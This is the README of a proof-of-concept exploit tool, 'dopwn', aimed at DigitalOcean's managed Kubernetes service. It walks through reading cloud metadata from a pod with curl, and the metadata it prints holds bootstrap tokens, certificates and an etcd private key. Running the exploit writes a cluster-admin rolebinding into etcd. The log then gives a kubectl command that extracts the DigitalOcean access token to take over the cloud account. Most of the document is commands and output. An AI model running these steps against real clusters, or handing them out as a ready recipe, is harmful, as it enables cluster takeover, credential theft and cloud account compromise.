# DigitalOcean Pwner

This is a proof-of-concept tool to exploit a combination of weaknesses in the new Kubernetes managed service from DigitalOcean.

## Caveats

This tool is going to write arbitrary objects into your Kubernetes cluster's `etcd` backend. It _should_ be ok but there's every chance something could go wrong so be prepared for that. If you break something it's absolutely not my fault, this code is provided as-is and without warranty.

If something breaks, raise an issue and I'll see if I can fix the code to prevent future similar events.

## Installation

Download the binary release from the Releases tab above.

## Usage

You need the output of the DigitalOcean user-data in a file. There's a number of ways you could get this, if you have access to a pod you can use cURL:

```bash
~ $ curl -qs http://169.254.169.254/metadata/v1/user-data
#cloud-config
k8saas_role: kubelet
k8saas_master_domain_name: "aac71799-f33a-444d-89a8-b20a3441635e.k8s.ondigitalocean.com"
k8saas_bootstrap_token: "4b7ae52cd675200f0955f69163d4c13c72a3b4e6ed6fcfb84bcf34add6dfc865"
k8saas_proxy_token: "6cb9b9da7256fc4f4759847d73e1dec2a47807c8ed6287c0986038d415c981fb"
k8saas_ca_cert: "-----BEGIN CERTIFICATE-----\nMIIDJzCCAg+gAwIBAgICBnUwDQYJKoZIhvcNAQELBQAwMzEVMBMGA1UEChMMRGln\naXRhbE9jZWFuMRowGAYDVQQDExFrOHNhYXMgQ2x1c3RlciBDQTAeFw0xODEyMjAx\nMDA2MjVaFw0zODEyMjAxMDA2MjVaMDMxFTATBgNVBAoTDERpZ2l0YWxPY2VhbjEa\nMBgGA1UEAxMRazhzYWFzIENsdXN0ZXIgQ0EwggEiMA0GCSqGSIb3DQEBAQUA[..]JO235eM7L\ne9ywg0QelxRTUjChNqC2QkE9H8YbqO5UmAma+ZxG0G71LOFU6nzardgNrOAd0VX9\nssOBlUJcyFBni9dE4wwNGMgg4ZJ8hZnqNGq9aKO5YxYexpRGvjs02XEqLQT6MhpC\nNOAS44LZ7QwHe37SoeIhq5mnFnaXYHobAjjKhprgTZS/oH80y9O9wOWqaVMiAGAD\ngm/xdELUeqItctGi9bsELWGzEAEj++90ysSTBSn3aEUnk1HCooEq5agvog==\n-----END CERTIFICATE-----\n"
k8saas_etcd_ca: "-----BEGIN CERTIFICATE-----\nMIIDJzCCAg+gAwIBAgICBnUwDQYJKoZIhvcNAQELBQAwMzEVMBMGA1UEChMMRGln[..]lsczwKsQs1BAMDfYZGQ/KwO8RNxZ4Ll0H83/cLsEq5VE\nLOqJzev29a/Gd2cGShpMjWVVT6GruFZ4hgdGncA2WIEvAWiSKc+0CcrM2SYnGgzs\nOEpx1uudl7YvXNYgn4IxvHab2UVWlm60dI3tKL5CtY5fZS47iWL4kuoP3HlQtm8n\n/9ks1nkcQlXJo41ENCISrt04wZdMxyRtUaDjewJvebkvCjtwr0m0T9kHJw==\n-----END CERTIFICATE-----\n"
k8saas_etcd_key: "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAuWXwbSO8Y9QtPxndGZUD5QHgLX5SnTz/9dKRcKhdHPvPDMkc\nK5kXKtWFmrK/4KunjLj9fX8s36sB0qe4dJrjPlVEZMOtfZUwlc+jLYSjxyYKtdmS\nA7wLxxV+beflo8x37A/0jyFl57efzmmNZ7T01TG4drt4eysr[..]n0YAe5xWaWOZ7e1xE4DqUbULeybNeBdLm/SJ+22dlmCgsphKeolzjWFeLKfg67Diw\n914gAC0CgYAP88QdhsOpW+Nzz5ddwjCK/o8cL7/nnORhf9TI7sPlYwNca3AEgR0w\n7jqbSvHJt8AIY4NSQaokB1yvealnaW1uTak6Ak0ote6TsO1xH+dRHH1eqVm55GtX\nKKkpKZcj6lFBLQ3ab5GxJA00D4yNinkDnxMC6tivdW2ZJgE1HAs/3A==\n-----END RSA PRIVATE KEY-----\n"
k8saas_etcd_cert: "-----BEGIN CERTIFICATE-----\nMIIEazCCA1OgAwIBAgICBnUwDQYJKoZIhvcNAQELBQAwMzEVMBMGA1UEChMMRGln\naXRhbE9jZWFuMRowGAYDVQQDExFrOHNhYXMgQ2x1c3RlciBDQTAeFw0xODEyMjAx\nMDA4MDBaFw0zODEyMjAxMDA4MDBaMFkxCzAJBgNVBAYTAlVTMQswCQYDVQQIEwJO\nWTERMA8GA1UEBxMITmV3IFlvcmsxFTATB[..]JNzdzeIWqCR+H8dlu3mZHhJ6+PZr/mxQTaTbT7bJMHpO+iZqxFRBsNZ1hN\nczftZQXKqHgLsy+q4lh2H0YcCI1GJy5XrO5Yb0UWYGyAAQUrc4wc5HrN7DmPtDpe\n9axdb4C1fZtkj1MvjItaCWBDU5OzQGEsYLugbw3U2Q==\n-----END CERTIFICATE-----\n"
k8saas_overlay_subnet: "10.244.0.0/16"
k8saas_dns_service_ip: "10.245.0.10"
```

Save this output to a file on your local machine, either by copy/paste or output from kubectl cp/exec, etc.

In this example, I'll put it in a file called `user-data.txt`. Now run `dopwn exploit` with the `-f` parameter specifying the location of the `user-data.txt` file.

```bash
$ dopwn exploit -f user-data.txt
2018-12-20T10:29:56Z [ℹ]  read metadata from file: user-data.txt
2018-12-20T10:29:56Z [ℹ]  parsing metadata to get etcd creds
2018-12-20T10:29:56Z [ℹ]  writing etcd ca to file: etcd-ca.crt
2018-12-20T10:29:56Z [ℹ]  writing etcd cert to file: etcd.crt
2018-12-20T10:29:56Z [ℹ]  writing etcd key to file: etcd.key
2018-12-20T10:29:56Z [ℹ]  fetching kube-system default service account token from etcd at aac71799-f33a-444d-89a8-b20a3441635e.k8s.ondigitalocean.com:2379
2018-12-20T10:29:58Z [ℹ]  decoding serviceAccount
2018-12-20T10:29:58Z [ℹ]  fetching serviceAccountToken secret
2018-12-20T10:29:58Z [ℹ]  decoding secret
2018-12-20T10:29:58Z [ℹ]  writing API server CA cert file to ca.crt
2018-12-20T10:29:58Z [ℹ]  generating kubeconfig
2018-12-20T10:29:58Z [ℹ]  wrote kubeconfig
2018-12-20T10:29:58Z [ℹ]  generating clusterrolebinding
2018-12-20T10:29:58Z [ℹ]  encoding clusterrolebinding
2018-12-20T10:29:58Z [ℹ]  inserting clusterrolebinding into etcd......wish me luck......
2018-12-20T10:29:58Z [ℹ]  o_O
2018-12-20T10:29:58Z [ℹ]  You are now cluster-admin using the token in kubeconfig
2018-12-20T10:29:58Z [ℹ]  For an added bonus, grab the digitalocean secret and take over the DO account too:
2018-12-20T10:29:58Z [ℹ]  kubectl --kubeconfig=kubeconfig -n kube-system get secret digitalocean -o jsonpath='{.data.access-token}' | base64 --decode
```

That's it, you're done. You should now have a file called `kubeconfig` in the same directory which you can use to access the cluster.

```bash
kubectl --kubeconfig=kubeconfig auth can-i get secrets
yes
```


### Contributing

This is frankly pretty fugly code. I'm not particularly proud of it. I don't think it's very idiomatic, it's got a big monolithic func call and at the moment there's an unnecessary subcommand. But it works. And I'm hoping the weaknesses won't be around long enough to justify the refactoring. If you want to tidy it up I would love the input though. Just submit a PR.